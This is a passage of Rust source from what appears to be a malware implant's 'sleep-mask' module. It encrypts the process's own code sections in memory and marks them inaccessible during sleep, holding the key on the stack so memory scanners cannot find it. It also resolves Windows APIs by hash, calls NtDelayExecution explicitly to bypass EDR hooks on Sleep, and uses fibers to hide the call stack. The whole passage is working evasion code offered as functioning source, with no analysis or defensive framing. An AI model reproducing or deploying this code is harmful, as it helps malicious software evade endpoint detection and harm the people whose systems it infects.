                                section.addr,
                            );
                            std::process::abort();
                        }
                    }
                }
                std::ptr::write_volatile(&mut key_copy as *mut _, [0u8; 32]);
                std::ptr::write_volatile(&mut section.nonce as *mut _, [0u8; AEAD_NONCE_LEN]);

                let mut restore_prev = 0u32;
                let _ = protect_region(
                    section.addr,
                    section.size,
                    section.orig_prot,
                    &mut restore_prev,
                );
            }

            // Zero and release the key page.
            free_key_page(kp, kplen);
            KEY_PAGE.with(|c| c.set(std::ptr::null_mut()));
            KEY_PAGE_LEN.with(|c| c.set(0));
        }
    }

    // ── Core encrypt / decrypt (Linux / non-Windows) ──────────────────────

    #[cfg(not(windows))]
    pub fn encrypt_sections() {
        unsafe {
            ENCRYPTED_SECTIONS.with(|s| {
                s.borrow_mut().clear();
            });
            SESSION_INITIALIZED.with(|c| c.set(false));

            // Allocate a private anonymous page to hold the session key.
            // This page is not part of any executable section and will not be
            // included in the encryption pass.
            let (kp, kplen) = alloc_key_page();
            if kp.is_null() {
                log::error!("encrypt_sections: failed to allocate key page — aborting");
                return;
            }

            // Generate random 32-byte key using OsRng and write to key page.
            let mut key = [0u8; 32];
            OsRng.fill_bytes(&mut key);
            std::ptr::copy_nonoverlapping(key.as_ptr(), kp, 32);
            std::ptr::write_volatile(&mut key as *mut _, [0u8; 32]);

            KEY_PAGE.with(|c| c.set(kp));
            KEY_PAGE_LEN.with(|c| c.set(kplen));

            let mut encrypted_count = 0usize;
            for (addr, size, orig_prot) in get_code_sections() {
                if addr.is_null() || size == 0 {
                    continue;
                }

                // Make region writable so we can encrypt it in-place.
                if !protect_region(addr, size, libc::PROT_READ | libc::PROT_WRITE) {
                    continue;
                }

                // Generate a fresh per-section 24-byte XChaCha20 nonce via OsRng.
                let mut nonce_bytes = [0u8; AEAD_NONCE_LEN];
                OsRng.fill_bytes(&mut nonce_bytes);

                // Read key from the key page, encrypt with XChaCha20-Poly1305.
                let mut key_copy = [0u8; 32];
                std::ptr::copy_nonoverlapping(kp, key_copy.as_mut_ptr(), 32);
                let tag = {
                    let cipher = XChaCha20Poly1305::new_from_slice(&key_copy)
                        .expect("key length is 32 bytes");
                    let nonce = XNonce::from_slice(&nonce_bytes);
                    let plaintext = std::slice::from_raw_parts(addr, size);
                    // AEAD encrypt produces ciphertext + 16-byte tag.
                    let mut ct_and_tag = cipher
                        .encrypt(nonce, plaintext)
                        .expect("XChaCha20-Poly1305 encryption failed");
                    // Copy ciphertext (without tag) back to the section in-place.
                    std::ptr::copy_nonoverlapping(ct_and_tag.as_ptr(), addr, size);
                    // Extract the 16-byte Poly1305 tag from the tail.
                    let mut tag = [0u8; AEAD_TAG_LEN];
                    tag.copy_from_slice(&ct_and_tag[size..]);
                    // Zero the temporary AEAD output.
                    zeroize::Zeroize::zeroize(&mut ct_and_tag);
                    tag
                };
                std::ptr::write_volatile(&mut key_copy as *mut _, [0u8; 32]);

                // Lock the section to PROT_NONE.
                if !protect_region(addr, size, libc::PROT_NONE) {
                    // Could not lock — decrypt the section so it stays consistent.
                    if protect_region(addr, size, orig_prot) {
                        let mut key_copy2 = [0u8; 32];
                        std::ptr::copy_nonoverlapping(kp, key_copy2.as_mut_ptr(), 32);
                        let cipher2 = XChaCha20Poly1305::new_from_slice(&key_copy2)
                            .expect("key length is 32 bytes");
                        let nonce2 = XNonce::from_slice(&nonce_bytes);
                        // Reassemble ciphertext + tag for decryption.
                        let mut ct_and_tag2 = Vec::with_capacity(size + AEAD_TAG_LEN);
                        std::ptr::copy_nonoverlapping(addr, ct_and_tag2.as_mut_ptr(), size);
                        ct_and_tag2.set_len(size);
                        ct_and_tag2.extend_from_slice(&tag);
                        if let Ok(pt) = cipher2.decrypt(nonce2, ct_and_tag2.as_slice()) {
                            std::ptr::copy_nonoverlapping(pt.as_ptr(), addr, size);
                        }
                        std::ptr::write_volatile(&mut key_copy2 as *mut _, [0u8; 32]);
                    }
                    std::ptr::write_volatile(&mut nonce_bytes as *mut _, [0u8; AEAD_NONCE_LEN]);
                    continue;
                }

                ENCRYPTED_SECTIONS.with(|s| {
                    s.borrow_mut().push(EncryptedSection {
                        addr,
                        size,
                        orig_prot: orig_prot as u32,
                        nonce: nonce_bytes,
                        tag,
                    });
                });
                std::ptr::write_volatile(&mut nonce_bytes as *mut _, [0u8; AEAD_NONCE_LEN]);
                encrypted_count += 1;
            }

            if encrypted_count > 0 {
                SESSION_INITIALIZED.with(|c| c.set(true));
            } else {
                free_key_page(kp, kplen);
                KEY_PAGE.with(|c| c.set(std::ptr::null_mut()));
                KEY_PAGE_LEN.with(|c| c.set(0));
            }
        }
    }

    #[cfg(not(windows))]
    pub fn decrypt_sections() {
        unsafe {
            if !SESSION_INITIALIZED.with(|c| c.get()) {
                log::warn!("decrypt_sections: called without prior encrypt_sections — skipping");
                return;
            }
            SESSION_INITIALIZED.with(|c| c.set(false));

            let kp = KEY_PAGE.with(|c| c.get());
            let kplen = KEY_PAGE_LEN.with(|c| c.get());

            let sections = ENCRYPTED_SECTIONS.with(|s| std::mem::take(&mut *s.borrow_mut()));
            for mut section in sections {
                if section.addr.is_null() || section.size == 0 {
                    continue;
                }

                if !protect_region(
                    section.addr,
                    section.size,
                    libc::PROT_READ | libc::PROT_WRITE,
                ) {
                    std::ptr::write_volatile(&mut section.nonce as *mut _, [0u8; AEAD_NONCE_LEN]);
                    continue;
                }

                // Reassemble ciphertext + tag, then AEAD-decrypt with tag verification.
                let mut key_copy = [0u8; 32];
                std::ptr::copy_nonoverlapping(kp, key_copy.as_mut_ptr(), 32);
                {
                    let cipher = XChaCha20Poly1305::new_from_slice(&key_copy)
                        .expect("key length is 32 bytes");
                    let nonce = XNonce::from_slice(&section.nonce);
                    // Build the ciphertext || tag buffer expected by the AEAD.
                    let mut ct_and_tag = Vec::with_capacity(section.size + AEAD_TAG_LEN);
                    std::ptr::copy_nonoverlapping(
                        section.addr,
                        ct_and_tag.as_mut_ptr(),
                        section.size,
                    );
                    ct_and_tag.set_len(section.size);
                    ct_and_tag.extend_from_slice(&section.tag);

                    match cipher.decrypt(nonce, ct_and_tag.as_slice()) {
                        Ok(plaintext) => {
                            std::ptr::copy_nonoverlapping(
                                plaintext.as_ptr(),
                                section.addr,
                                section.size,
                            );
                        }
                        Err(_) => {
                            // Poly1305 tag verification FAILED — the encrypted
                            // section was tampered with during sleep.  Executing
                            // tampered code is unacceptable; terminate immediately.
                            log::error!(
                                "decrypt_sections: Poly1305 tag verification FAILED for section at {:p} \
                                 — possible EDR tampering detected. Terminating process.",
                                section.addr,
                            );
                            std::process::abort();
                        }
                    }
                }
                std::ptr::write_volatile(&mut key_copy as *mut _, [0u8; 32]);
                std::ptr::write_volatile(&mut section.nonce as *mut _, [0u8; AEAD_NONCE_LEN]);

                // Restore the original page protection.
                let _ = protect_region(section.addr, section.size, section.orig_prot as i32);
            }

            // Zero and release the key page.
            free_key_page(kp, kplen);
            KEY_PAGE.with(|c| c.set(std::ptr::null_mut()));
            KEY_PAGE_LEN.with(|c| c.set(0));
        }
    }
}

/// Stack-local-key section encryption helpers for the sleep-mask feature.
///
/// Unlike the [`crypto`] module, which allocates a separate memory page for
/// the session key, these helpers accept the 32-byte key by reference so the
/// caller can hold it in a **stack-local** variable.  Only the per-section
/// nonces and addresses are stored on the heap (inside the returned
/// `Vec<SectionEntry>`).  This prevents memory-scanning tools from locating
/// the key via known global or thread-local offsets.
pub mod stack_mask {
    #[cfg(windows)]
    use super::{PAGE_NOACCESS, PAGE_READWRITE};

    use chacha20::cipher::{KeyIvInit, StreamCipher};
    use chacha20::ChaCha20;
    use rand::RngCore;

    /// Per-section state required to decrypt after sleep.
    pub struct SectionEntry {
        pub addr: *mut u8,
        pub len: usize,
        /// Original page-protection flags (Windows PAGE_* or POSIX PROT_*).
        pub orig_prot: u32,
        /// Per-section ChaCha20 nonce (12 bytes); zeroed after decryption.
        pub nonce: [u8; 12],
    }

    // SAFETY: SectionEntry holds a raw pointer into the current process image.
    // Access is confined to the single calling thread within `execute_sleep`.
    unsafe impl Send for SectionEntry {}
    unsafe impl Sync for SectionEntry {}

    /// Encrypt all code sections in-place using `key`.
    ///
    /// For each section the page is made writable with `VirtualProtect`, the
    /// bytes are XOR'd with a ChaCha20 keystream, and the original protection
    /// is restored.  Returns per-section state needed for decryption.
    #[cfg(windows)]
    pub unsafe fn encrypt_with_key(key: &[u8; 32]) -> Vec<SectionEntry> {
        let sections = super::crypto::get_code_sections();
        let mut result = Vec::with_capacity(sections.len());
        for (addr, size) in sections {
            if addr.is_null() || size == 0 {
                continue;
            }
            let mut orig_prot = 0u32;
            if !super::crypto::protect_region(addr, size, PAGE_READWRITE, &mut orig_prot) {
                continue;
            }
            let mut nonce = [0u8; 12];
            rand::thread_rng().fill_bytes(&mut nonce);
            {
                let mut cipher = ChaCha20::new(
                    chacha20::Key::from_slice(key),
                    chacha20::Nonce::from_slice(&nonce),
                );
                cipher.apply_keystream(std::slice::from_raw_parts_mut(addr, size));
            }
            // Set PAGE_NOACCESS so that encrypted sections are completely
            // inaccessible during the sleep window, preventing memory scanners
            // from reading high-entropy encrypted data.  The original protection
            // is saved in the SectionEntry and restored by decrypt_with_key().
            let mut dummy = 0u32;
            let _ = super::crypto::protect_region(addr, size, PAGE_NOACCESS, &mut dummy);
            result.push(SectionEntry {
                addr,
                len: size,
                orig_prot,
                nonce,
            });
        }
        result
    }

    /// Decrypt sections previously encrypted by [`encrypt_with_key`].
    ///
    /// Each section is made writable, XOR'd with the same keystream to recover
    /// the original bytes, and the original protection is restored.
    /// Per-section nonces are zeroed in place after use.
    #[cfg(windows)]
    pub unsafe fn decrypt_with_key(sections: &mut Vec<SectionEntry>, key: &[u8; 32]) {
        for section in sections.iter_mut() {
            if section.addr.is_null() || section.len == 0 {
                continue;
            }
            let mut dummy = 0u32;
            if !super::crypto::protect_region(section.addr, section.len, PAGE_READWRITE, &mut dummy)
            {
                core::ptr::write_volatile(&mut section.nonce, [0u8; 12]);
                continue;
            }
            {
                let mut cipher = ChaCha20::new(
                    chacha20::Key::from_slice(key),
                    chacha20::Nonce::from_slice(&section.nonce),
                );
                cipher.apply_keystream(std::slice::from_raw_parts_mut(section.addr, section.len));
            }
            core::ptr::write_volatile(&mut section.nonce, [0u8; 12]);
            let mut dummy2 = 0u32;
            let _ = super::crypto::protect_region(
                section.addr,
                section.len,
                section.orig_prot,
                &mut dummy2,
            );
        }
    }

    /// Non-Windows: encrypt using `mprotect` to make sections writable.
    #[cfg(not(windows))]
    pub unsafe fn encrypt_with_key(key: &[u8; 32]) -> Vec<SectionEntry> {
        let sections = super::crypto::get_code_sections();
        let mut result = Vec::with_capacity(sections.len());
        for (addr, size, orig_prot) in sections {
            if addr.is_null() || size == 0 {
                continue;
            }
            if !super::crypto::protect_region(addr, size, libc::PROT_READ | libc::PROT_WRITE) {
                continue;
            }
            let mut nonce = [0u8; 12];
            rand::thread_rng().fill_bytes(&mut nonce);
            {
                let mut cipher = ChaCha20::new(
                    chacha20::Key::from_slice(key),
                    chacha20::Nonce::from_slice(&nonce),
                );
                cipher.apply_keystream(std::slice::from_raw_parts_mut(addr, size));
            }
            let _ = super::crypto::protect_region(addr, size, orig_prot);
            result.push(SectionEntry {
                addr,
                len: size,
                orig_prot: orig_prot as u32,
                nonce,
            });
        }
        result
    }

    /// Non-Windows: decrypt using `mprotect` to make sections writable.
    #[cfg(not(windows))]
    pub unsafe fn decrypt_with_key(sections: &mut Vec<SectionEntry>, key: &[u8; 32]) {
        for section in sections.iter_mut() {
            if section.addr.is_null() || section.len == 0 {
                continue;
            }
            if !super::crypto::protect_region(
                section.addr,
                section.len,
                libc::PROT_READ | libc::PROT_WRITE,
            ) {
                core::ptr::write_volatile(&mut section.nonce, [0u8; 12]);
                continue;
            }
            {
                let mut cipher = ChaCha20::new(
                    chacha20::Key::from_slice(key),
                    chacha20::Nonce::from_slice(&section.nonce),
                );
                cipher.apply_keystream(std::slice::from_raw_parts_mut(section.addr, section.len));
            }
            core::ptr::write_volatile(&mut section.nonce, [0u8; 12]);
            let _ =
                super::crypto::protect_region(section.addr, section.len, section.orig_prot as i32);
        }
    }
}

pub mod spoof {
    use super::*;

    // Thread-local state for fiber-based stack spoofing.
    thread_local! {
        pub(super) static MAIN_FIBER: std::cell::Cell<*mut std::ffi::c_void> =
            const { std::cell::Cell::new(std::ptr::null_mut()) };
        pub(super) static SLEEP_FIBER: std::cell::Cell<*mut std::ffi::c_void> =
            const { std::cell::Cell::new(std::ptr::null_mut()) };
        pub(super) static SLEEP_DURATION_NS: std::cell::Cell<u64> = const { std::cell::Cell::new(0) };
        pub(super) static LAST_SWITCH_SUCCEEDED: std::cell::Cell<bool> = const { std::cell::Cell::new(false) };
    }

    #[cfg(windows)]
    pub fn spoof_stack() -> bool {
        // Convert the current thread to a fiber so we can switch away from it.
        // This hides the current call stack during the sleep window.
        unsafe {
            let convert_thread_to_fiber: FnConvertThreadToFiber =
                win_resolve::resolve_kernel32(HASH_CONVERTTHREADTOFIBER)
                    .expect("ConvertThreadToFiber resolve failed");
            let create_fiber: FnCreateFiber = win_resolve::resolve_kernel32(HASH_CREATEFIBER)
                .expect("CreateFiber resolve failed");
            let switch_to_fiber: FnSwitchToFiber =
                win_resolve::resolve_kernel32(HASH_SWITCHTOFIBER)
                    .expect("SwitchToFiber resolve failed");
            // P1-02: Resolve NtDelayExecution from ntdll instead of
            // kernel32!Sleep.  kernel32!Sleep is a well-known EDR hook target;
            // NtDelayExecution goes direct to the kernel.
            let nt_delay_exec: FnNtDelayExecution =
                win_resolve::resolve_ntdll(win_resolve::HASH_NTDELAYEXECUTION)
                    .expect("NtDelayExecution resolve failed");

            // Store into static atomics for the fiber callback
            NTDELAY_PTR.store(nt_delay_exec as u64, std::sync::atomic::Ordering::SeqCst);
            SWITCHTOFIBER_PTR.store(switch_to_fiber as u64, std::sync::atomic::Ordering::SeqCst);

            // Ensure the thread-local fiber guard is initialised so that
            // cleanup_fibers() runs when this thread exits.
            super::FIBER_GUARD.with(|_| {});

            LAST_SWITCH_SUCCEEDED.with(|c| c.set(false));

            // Only convert once per thread
            let main_fiber = MAIN_FIBER.with(|f| f.get());
            let main_fiber = if main_fiber.is_null() {
                let f = convert_thread_to_fiber(std::ptr::null_mut());
                if !f.is_null() {
                    MAIN_FIBER.with(|cell| cell.set(f));
                }
                f
            } else {
                main_fiber
            };

            if main_fiber.is_null() {
                log::warn!("spoof_stack: ConvertThreadToFiber failed");
                return false;
            }

            // Create the sleep fiber if not yet created
            let sleep_fiber = SLEEP_FIBER.with(|f| f.get());
            let sleep_fiber = if sleep_fiber.is_null() {
                extern "system" fn sleep_fiber_proc(_param: *mut std::ffi::c_void) {
                    unsafe {
                        loop {
                            let ns = SLEEP_DURATION_NS.with(|c| c.get());
                            if ns > 0 {
                                // P1-02: Sleep via NtDelayExecution (ntdll)
                                // instead of kernel32!Sleep to avoid EDR hooks.
                                // NtDelayExecution takes a pointer to a LARGE_INTEGER
                                // (i64) in 100-ns units; negative = relative timeout.
                                let ms = (ns / 1_000_000).max(1) as i64;
                                let mut large_int = -10_000 * ms; // negative = relative
                                let nt_delay: FnNtDelayExecution = std::mem::transmute(
                                    NTDELAY_PTR.load(std::sync::atomic::Ordering::SeqCst),
                                );
                                nt_delay(0, &mut large_int);
                            }
                            // Switch back to the main fiber
                            let main = MAIN_FIBER.with(|c| c.get());
                            if !main.is_null() {
                                let switch_fn: FnSwitchToFiber = std::mem::transmute(
                                    SWITCHTOFIBER_PTR.load(std::sync::atomic::Ordering::SeqCst),
                                );
                                switch_fn(main);
                            }
                        }
                    }
                }
                let sf = create_fiber(0, Some(sleep_fiber_proc), std::ptr::null_mut());
                if !sf.is_null() {
                    SLEEP_FIBER.with(|cell| cell.set(sf));
                }
                sf
            } else {
                sleep_fiber
            };

            if sleep_fiber.is_null() {
                log::warn!("spoof_stack: CreateFiber failed");
                return false;
            }

            log::debug!("spoof_stack: switching to sleep fiber (main thread stack hidden)");
            // Switch to the sleep fiber — the current thread's call stack is
            // now hidden.  The sleep fiber will call Sleep() and then
            // switch_to_fiber(main_fiber), which resumes execution right here.
            switch_to_fiber(sleep_fiber);
            LAST_SWITCH_SUCCEEDED.with(|c| c.set(true));
            true
        }
    }

    #[cfg(windows)]
    pub fn restore_stack() -> bool {
        // Switch back happens inside the sleep fiber proc automatically.
        // This function is a no-op since the fiber already returned control.
        let switched = LAST_SWITCH_SUCCEEDED.with(|c| c.replace(false));
        if switched {
            log::debug!("restore_stack: resumed from sleep fiber");
        } else {
            log::debug!("restore_stack: no fiber switch to restore");
        }
        switched
    }

    #[cfg(not(windows))]
    pub fn spoof_stack() -> bool {
        false
    }

    #[cfg(not(windows))]
    pub fn restore_stack() -> bool {
        false
    }
}

// ── Automatic fiber cleanup via thread-local guard ──────────────────────────
//
// `FIBER_GUARD` is a thread-local whose Drop impl calls `cleanup_fibers()`.
// It is initialised the first time `spoof_stack()` runs on a given thread.
// When that thread exits, the Rust runtime drops `FIBER_GUARD`, which in turn
// calls `cleanup_fibers()` — releasing the fiber handles created by
// `ConvertThreadToFiber` / `CreateFiber`.

/// RAII guard that releases per-thread fiber handles on Drop.
///
/// Stored in a `thread_local!` so it lives for the entire lifetime of the
/// thread.  When the thread exits, the runtime drops the guard, which calls
/// `cleanup_fibers()` to release any fibers created by `spoof::spoof_stack`.
struct FiberGuard;

impl Drop for FiberGuard {
    fn drop(&mut self) {
        cleanup_fibers();
    }
}

thread_local! {
    /// Per-thread guard that ensures fibers are cleaned up when the thread exits.
    /// Initialised lazily on first access (triggered by `spoof_stack()`).
    static FIBER_GUARD: FiberGuard = const { FiberGuard };
}

/// Release any fiber handles created by `spoof::spoof_stack` for the calling
/// thread.  Called automatically when the thread exits via `FIBER_GUARD`'s Drop
/// impl.  Can also be called manually before shutdown if needed.
pub fn cleanup_fibers() {
    #[cfg(windows)]
    {
        let convert_fiber_to_thread: FnConvertFiberToThread = unsafe {
            win_resolve::resolve_kernel32(HASH_CONVERTFIBERTOTHREAD)
                .expect("ConvertFiberToThread resolve failed")
        };
        let delete_fiber: FnDeleteFiber = unsafe {
            win_resolve::resolve_kernel32(HASH_DELETEFIBER).expect("DeleteFiber resolve failed")
        };
        spoof::SLEEP_FIBER.with(|f| {
            let handle = f.get();
            if !handle.is_null() {
                unsafe { delete_fiber(handle) };
                f.set(std::ptr::null_mut());
            }
        });
        spoof::MAIN_FIBER.with(|f| {
            let handle = f.get();
            if !handle.is_null() {
                // The main fiber was created by ConvertThreadToFiber, which
                // makes the calling thread itself a fiber.  Release it via
                // ConvertFiberToThread; DeleteFiber on the *current* fiber
                // would terminate the thread.
                unsafe { convert_fiber_to_thread() };
                f.set(std::ptr::null_mut());
            }
        });
    }
}
